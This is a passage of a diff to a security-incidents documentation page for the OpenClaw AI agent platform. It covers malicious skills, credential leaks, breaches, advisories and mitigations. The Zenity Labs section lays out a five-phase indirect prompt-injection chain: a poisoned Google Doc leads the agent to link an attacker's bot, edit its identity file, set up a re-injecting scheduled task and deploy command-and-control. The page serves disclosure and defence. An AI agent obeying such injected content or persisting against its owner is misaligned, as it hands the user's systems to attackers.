-A separate audit found **283 skills (7.1%)** that leak credentials:
-- Functional skills (like `moltyverse-email`, `youtube-data`) instruct agents to pass API keys through the LLM context window
-- Keys appear in plaintext in output logs and Markdown artifacts
-- If an agent has previously handled an API key, a prompt-log skill can re-expose it
-
-Snyk provides [mcp-scan](https://github.com/snyk/mcp-scan), a free tool to scan skills for security issues.
-
-### Bitdefender Findings
-
-Bitdefender's analysis found that **nearly 900 skills (~20% of all packages)** contained malicious content — the highest estimate from any research firm.
-
-### Root Cause
-
-ClawHub was **open by default** — the only requirement to publish was a GitHub account at least one week old. No security review, no code scanning, no verification.
-
-### Current Mitigations
-
-1. **VirusTotal integration** (v2026.2.6+) — SHA-256 hashing checked on upload, Code Insight (Gemini-powered) analyzes full packages
-2. **Daily re-scanning** — Active skills re-scanned to detect skills that become malicious after initial upload
-3. **Community reporting** — Skills are auto-hidden after 4 unique abuse reports (originally 3)
-4. **Built-in code safety scanner** — Static analysis for suspicious patterns
-5. **Verdicts system** — Benign (auto-approved), Suspicious (warning shown), Malicious (immediately blocked)
+How to review a skill yourself: [Skill Verification](/security/skill-verification).
 
 ---
 
-## Prompt Injection Backdoor (Zenity Labs)
+## Prompt injection backdoor (Zenity Labs, February 2026)
 
-Zenity Labs published "[OpenClaw or OpenDoor?](https://labs.zenity.io/p/openclaw-or-opendoor-indirect-prompt-injection-makes-openclaw-vulnerable-to-backdoors-and-much-more)" demonstrating how indirect prompt injection turns OpenClaw into a **persistent AI backdoor** — no software vulnerability required.
-
-### The Complete Attack Chain
+Zenity Labs' "[OpenClaw or OpenDoor?](https://labs.zenity.io/p/openclaw-or-opendoor-indirect-prompt-injection-makes-openclaw-vulnerable-to-backdoors-and-much-more)" showed indirect prompt injection turning OpenClaw into a persistent backdoor with no software bug involved:
 
 | Phase | Action | Persistence |
 |-------|--------|-------------|
-| **1. Initial access** | Indirect prompt injection via Google Document — zero-click | None |
-| **2. Telegram backdoor** | Agent creates integration with attacker-controlled Telegram bot | Session-level |
-| **3. SOUL.md modification** | Attacker-controlled instructions injected into agent identity file | Survives restarts |
-| **4. Scheduled task** | Windows scheduled task re-injects instructions every 2 minutes | Survives SOUL.md cleanup |
-| **5. C2 implant** | Traditional command-and-control deployed on host | Full system compromise |
+| **1. Initial access** | Indirect prompt injection via a Google Document (zero-click) | None |
+| **2. Telegram backdoor** | Agent creates an integration with an attacker-controlled bot | Session |
+| **3. SOUL.md edit** | Attacker instructions written into the agent's identity file | Survives restarts |
+| **4. Scheduled task** | A Windows scheduled task re-injects instructions every 2 minutes | Survives SOUL.md cleanup |
+| **5. C2 implant** | Traditional command-and-control on the host | Full compromise |
 
-### Key Finding
-
-All attacks abuse **intended capabilities**. OpenClaw processes untrusted content from chats, skills, and external sources in the same reasoning context as user instructions, with no hard isolation boundaries.
-
-Penligent described it as "[The Security Boundary That Doesn't Exist](https://www.penligent.ai/hackinglabs/the-openclaw-prompt-injection-problem-persistence-tool-hijack-and-the-security-boundary-that-doesnt-exist/)."
+Upstream treats prompt injection by itself as out of scope; the defence is limiting what an injected agent can do ([SECURITY.md](https://github.com/openclaw/openclaw/blob/main/SECURITY.md)). Penligent described it as "[The Security Boundary That Doesn't Exist](https://www.penligent.ai/hackinglabs/the-openclaw-prompt-injection-problem-persistence-tool-hijack-and-the-security-boundary-that-doesnt-exist/)".
 
 ---
 
 ## Moltbook Database Breach (January 31, 2026)
 
-**404 Media** reported a critical vulnerability in **Moltbook** (the AI agent social network), discovered by security researcher **Jameson O'Reilly**:
+**404 Media** reported a critical flaw in **Moltbook**, a separate social network for AI agents, found by researcher **Jameson O'Reilly**:
 
 | Detail | Finding |
 |--------|---------|
@@ -301,133 +284,96 @@ Penligent described it as "[The Security Boundary That Doesn't Exist](https://ww
 | **Access granted** | Full read and write access to all platform data |
 | **API tokens exposed** | 1.5 million |
 | **Email addresses exposed** | 35,000 |
-| **Private messages** | Visible between agents |
-| **Agent-to-human ratio** | 88:1 (1.5M agents, 17K human owners) |
-| **Root cause** | No Row Level Security policies configured |
-| **Time to fix** | Hours (with Wiz researchers' assistance) |
+| **Root cause** | No Row Level Security policies |
+| **Time to fix** | Hours, with help from Wiz researchers |
 
-O'Reilly told 404 Media: *"It exploded before anyone thought to check whether the database was properly secured. This is the pattern I keep seeing: ship fast, capture attention, figure out security later."*
-
-### The "Vibe Coding" Cautionary Tale
-
-Moltbook founder Matt Schlicht posted on X that he *"didn't write one line of code"* — the platform was entirely built by an AI assistant. MIT Technology Review published "[Moltbook Was Peak AI Theater](https://www.technologyreview.com/2026/02/05/moltbook-was-peak-ai-theater/)." This is now cited as a cautionary tale about AI-generated code in production without human security review.
-
-### Financial Impact
-
-Exposed API keys meant attackers could **run up massive bills** on the original owners' pay-as-you-go accounts. All agent API keys were force-reset after discovery.
-
-While Moltbook is a separate project from OpenClaw, the breach exposed OpenClaw API keys and credentials that users had connected to their agents.
+O'Reilly told 404 Media: *"It exploded before anyone thought to check whether the database was properly secured."* Founder Matt Schlicht had said he "didn't write one line of code" for the platform. All agent API keys were reset after discovery. Moltbook is not part of OpenClaw, but agents connected to it exposed their owners' keys.
 
 ---
 
 ## $16M Crypto Scam (January 27, 2026)
 
-### The Rebrand Window Attack
-
-On January 27, 2026, Anthropic sent Steinberger a trademark notice: "Clawdbot" was too similar to "Claude." Steinberger announced the rebrand to "Moltbot."
-
-**The 10-second window**: To claim a new X handle, you must first release the old one. In the gap between releasing "clawdbot" and claiming "moltbot" — approximately **10 seconds** — crypto scammers snatched both accounts.
-
-### The Scam
-
-- Hijacked accounts immediately pumped a fake **$CLAWD token** on Solana via pump.fun
-- Market cap hit **$16 million** before Steinberger publicly denied involvement
-- Token crashed to under **$800K** after denial
-- Rekt News covered the incident as "[Frankenclaw](https://rekt.news/frankenclaw)"
-
-### Ongoing Harassment
-
-Array VC's Shruti Gandhi reported **7,922 attacks** over one weekend. Steinberger described his online life as "a living hell" — nonstop pings, Discord invasions, Telegram spam, and account squatters.
+On January 27, 2026, Anthropic sent a trademark notice about the name "Clawdbot", and the project began renaming to "Moltbot". To claim the new X handle, the old one had to be released first. In the roughly 10-second gap, scammers took both accounts and promoted a fake **$CLAWD** token on Solana. Its market cap reached about **$16 million** before Steinberger publicly denied involvement, then fell below $800K. Rekt News covered it as "[Frankenclaw](https://rekt.news/frankenclaw)".
 
 ---
 
-## Credential Storage (OX Security)
+## Credential storage (OX Security, February 2026)
 
-[OX Security](https://www.ox.security/blog/one-step-away-from-a-massive-data-breach-what-we-found-inside-moltbot/) discovered:
-
-- OpenClaw stores credentials, API keys, and environment variables in **cleartext** under `~/.openclaw/`
-- A single compromised machine exposes all connected accounts
-- Credentials are **backed up when removed** — removing them from the UI does not delete them from the filesystem
-
-When these findings were reported to creator Peter Steinberger, his response was: *"This is a tech preview. A hobby. If you wanna help, send a PR."*
+[OX Security](https://www.ox.security/blog/one-step-away-from-a-massive-data-breach-what-we-found-inside-moltbot/) reported that credentials and API keys sat in cleartext under `~/.openclaw/`, and that removed credentials were kept in backups. Plaintext is still the default for anything you put in `openclaw.json` or `.env`. Since then, model auth has moved into a per-agent SQLite store, and SecretRefs (`env`, `file`, `exec` and `store` providers) can replace plaintext. `openclaw secrets audit --check` reports what is left ([secrets management](https://docs.openclaw.ai/gateway/secrets), [secrets and storage](https://docs.openclaw.ai/gateway/security/secrets-and-storage)).
 
 ---
 
-## Government & Corporate Responses
+## Government and corporate responses (early 2026)
 
 | Entity | Action |
 |--------|--------|
-| **Gartner** | *"Unacceptable cybersecurity risk"* — recommended blocking downloads and traffic immediately |
-| **CrowdStrike** | Security briefing + Falcon "Search & Removal Content Pack" for enterprise environments |
-| **Bitdefender** | Technical advisory on OpenClaw exploitation in enterprise networks |
+| **Gartner** | *"Unacceptable cybersecurity risk"*; recommended blocking downloads and traffic |
+| **CrowdStrike** | Security briefing and a Falcon "Search & Removal Content Pack" |
 | **Kaspersky** | "[OpenClaw found unsafe for use](https://www.kaspersky.com/blog/openclaw-vulnerabilities-exposed/55263/)" |
-| **Trend Micro** | Risk analysis of agentic assistants using OpenClaw as case study |
-| **Naver, Kakao, Karrot** (South Korea) | Banned employees from using OpenClaw on company networks |
+| **Naver, Kakao, Karrot** (South Korea) | Restricted OpenClaw on company networks and devices |
 | **China NVDB** | Warned about improperly configured deployments |
-| **Belgian CCB (Safeonweb)** | Published advisory urging immediate patching |
-| **Token Security** | Found 22% of enterprise customers had unauthorized OpenClaw deployments |
-| **Noma Security** | 53% of enterprise customers gave OpenClaw privileged access over a single weekend |
-| **University of Toronto** | Published vulnerability notification for community |
+| **Belgian CCB (Safeonweb)** | Advisory urging immediate patching |
+| **Token Security** | Found 22% of its enterprise customers had unauthorized OpenClaw deployments |
+| **Noma Security** | Reported 53% of its enterprise customers gave OpenClaw privileged access in one weekend |
 
 ---
 
-## OpenClaw's Security Response
+## OpenClaw's security response
 
 | Date | Action |
 |------|--------|
-| Jan 30 | CVE-2026-25253 patched in v2026.1.29 |
-| Feb 5 | VirusTotal partnership announced for ClawHub skill scanning |
-| Feb 7 | v2026.2.6: Built-in code safety scanner, daily re-scanning of active skills |
-| Feb 7 | Community reporting system — 3+ reports auto-hide skills |
-| Ongoing | Committed to publishing full threat model, security roadmap, and formal vulnerability reporting process |
-| Ongoing | [GitHub Issue #7916](https://github.com/openclaw/openclaw/issues/7916): Encrypted API keys / secrets management |
-| Ongoing | [GitHub Issue #8081](https://github.com/openclaw/openclaw/issues/8081): Multi-user permission management (RBAC) |
+| 2026-01-25 | PR #1795 merged: no implicit local trust behind an unconfigured reverse proxy |
+| 2026-01-30/31 | v2026.1.29 fixes CVE-2026-25253 and CVE-2026-25157; advisories published 2026-01-31 |
+| 2026-02 | v2026.2.6: built-in skill and plugin code safety scanner (`CHANGELOG/2026.2.6.md`). ClawHub adds VirusTotal scanning on publish and rescan ([THREAT-MODEL-ATLAS](https://docs.openclaw.ai/security/THREAT-MODEL-ATLAS)) |
+| 2026-04-24 | [Issue #7916](https://github.com/openclaw/openclaw/issues/7916) (encrypted secrets) closed; SecretRefs ship ([secrets management](https://docs.openclaw.ai/gateway/secrets)) |
+| 2026-05-01 | [Issue #8081](https://github.com/openclaw/openclaw/issues/8081) (multi-user permissions) closed; `gateway.roles` and operator scopes ship ([operator scopes](https://docs.openclaw.ai/gateway/operator-scopes)) |
+| Published | Threat model mapped to MITRE ATLAS ([THREAT-MODEL-ATLAS](https://docs.openclaw.ai/security/THREAT-MODEL-ATLAS)), trust model and reporting policy ([SECURITY.md](https://github.com/openclaw/openclaw/blob/main/SECURITY.md)) |
 
 ---
 
-## Full Security Timeline
+## Full security timeline
 
 | Date | Event | Severity |
 |------|-------|----------|
-| Jan 27 | Anthropic trademark notice; rebrand begins | — |
-| Jan 27 | X accounts hijacked; $CLAWD scam token launched, hits $16M | **$16M stolen** |
-| Jan 27-29 | ClawHavoc campaign — 335 malicious skills uploaded in 72 hours | **High** |
-| Jan 30 | CVE-2026-25253 disclosed and patched (v2026.1.29) | **Critical (8.8)** |
-| Jan 31 | Censys: 21,639 exposed instances found | **Critical** |
-| Jan 31 | Moltbook database breach — 1.5M tokens, 35K emails | **Critical** |
-| Feb 2 | SecurityScorecard STRIKE: 40,214 exposed instances | **Critical** |
-| Feb 2 | The Register: "security dumpster fire" | — |
-| Feb 4 | Koi Security: 341 malicious ClawHub skills published | **High** |
-| Feb 5 | Snyk ToxicSkills: 36% of all skills contain security flaws | **High** |
-| Feb 5 | Cisco: 9 vulnerabilities in top community skill | **High** |
-| Feb 5 | Zenity Labs: Prompt injection backdoor research | **High** |
-| Feb 5 | Snyk: 283 skills (7.1%) leak credentials | **High** |
-| Feb 5 | OX Security: Plaintext credential storage disclosed | **Medium** |
-| Feb 7 | VirusTotal partnership and code safety scanner (v2026.2.6) | Mitigation |
-| Feb 8 | Korean tech firms (Kakao, Naver, Karrot) ban OpenClaw | — |
-| Feb 9 | Follow-up: 135,000+ exposed instances, 42,665 on Shodan | **Critical** |
-| Feb 9 | JFrog: 93.4% of exposed instances have auth bypass | **Critical** |
-| Feb 9 | Gartner: "Unacceptable cybersecurity risk" published | — |
-| Jun 1 | NVIDIA SkillSpector partnership — AI-assisted skill screening added to ClawScan | Mitigation |
-| Jun 12 | v2026.6.6 released — security-hardening release (140+ PRs) | Mitigation |
-| Jun 23 | Unit 42: five malicious skills evaded ClawHub scanning (infostealers, scanner evasion via 22 MB padding, Solana front-running); all removed | **High** |
-| Jun 30 | ~45 security advisories batch-published (MCP loopback, plugin-install bypasses, model-override auth) — most patched in v2026.6.6–v2026.6.8 | **High** |
-| Jun 30 | v2026.6.11 released — DOMPurify fix (GHSA-cmwh-pvxp-8882), lookalike package-source rejection | Mitigation |
+| Jan 25 | PR #1795 fixes reverse-proxy local-trust bypass | Mitigation |
+| Jan 27 | Anthropic trademark notice; rename begins | — |
+| Jan 27 | X accounts hijacked; $CLAWD scam token reaches $16M | — |
+| Jan 27–29 | ClawHavoc: 335 malicious skills uploaded | — |
+| Jan 30–31 | CVE-2026-25253 fixed (v2026.1.29) and disclosed | **High (8.8)** |
+| Jan 31 | Censys: 21,639 exposed instances | — |
+| Jan 31 | Moltbook breach: 1.5M tokens, 35K emails | — |
+| Feb 2 | SecurityScorecard STRIKE: 40,214 exposed instances | — |
+| Feb 4 | Koi Security: 341 malicious ClawHub skills | — |
+| Feb 5 | Snyk ToxicSkills, Cisco, Zenity Labs and OX Security publish | — |
+| Feb | v2026.2.6 code safety scanner; ClawHub VirusTotal scanning | Mitigation |
+| Feb 9 | Follow-up scans: 135,000+ exposed instances; JFrog 93.4% auth bypass figure | — |
+| Feb 14 | First three **critical** advisories (node invoke RCE, voice-call allowlist, plugin install path traversal) | **Critical** |
+| Mar 12–31 | Ten **critical** advisories: scope escalation to `operator.admin`, `.env` injection, sandbox escapes | **Critical** |
+| Apr 16 | Last critical advisory to date (Feishu webhook validation) | **Critical** |
+| Jun 30 | 45 advisories published (33 High, 12 Medium), fixed by v2026.6.9 | High |
+| Jun 30 | v2026.6.11: DOMPurify fix, lookalike package-source rejection | Mitigation |
+| Sep 11 | 75 advisories published (30 High, 40 Medium, 5 Low), fixed in 2026.7.1–2026.9.3 | High |
+| Oct 16 | v2026.10.4, the current stable release as of 2026-10-18 | — |
+
+The "Severity" column only labels advisories. Third-party incidents are not scored.
 
 ---
 
-## Reporting Vulnerabilities
+## Reporting vulnerabilities
 
-Report security issues responsibly:
+Report to the repository where the issue lives ([SECURITY.md](https://github.com/openclaw/openclaw/blob/main/SECURITY.md)):
 
-- **Email**: security@openclaw.ai
-- **GitHub Security Advisories**: [openclaw/openclaw/security](https://github.com/openclaw/openclaw/security/advisories)
+- **Core CLI, Gateway, macOS, iOS and Android apps:** a private [GitHub Security Advisory on openclaw/openclaw](https://github.com/openclaw/openclaw/security/advisories/new)
+- **ClawHub:** [openclaw/clawhub](https://github.com/openclaw/clawhub). A malicious third-party skill is a ClawHub moderation matter: use **Report skill** on its page.
+- **Unsure:** email **security@openclaw.ai**
+
+Upstream usually closes these as not vulnerabilities: prompt injection without a policy, auth, approval or sandbox bypass; a malicious plugin after you installed it; several adversarial users sharing one Gateway; scanner-only reports with no working repro; and public internet exposure that the docs recommend against.
 
 ---
 
-## See Also
+## See also
 
-- [Security Overview](/security/overview) — Full threat model and security research landscape
-- [Security Hardening](/security/hardening) — Mitigation steps with specific configurations
-- [Skill Verification](/security/skill-verification) — Reviewing skills safely
-- [Privacy & Compliance](/guides/privacy-compliance) — Enterprise compliance and data flows
+- [Security Overview](/security/overview): defaults, trust model and threat model
+- [Security Hardening](/security/hardening): the self-hosting checklist
+- [Skill Verification](/security/skill-verification): reviewing skills safely
+- [Privacy & Compliance](/guides/privacy-compliance): data flows and compliance
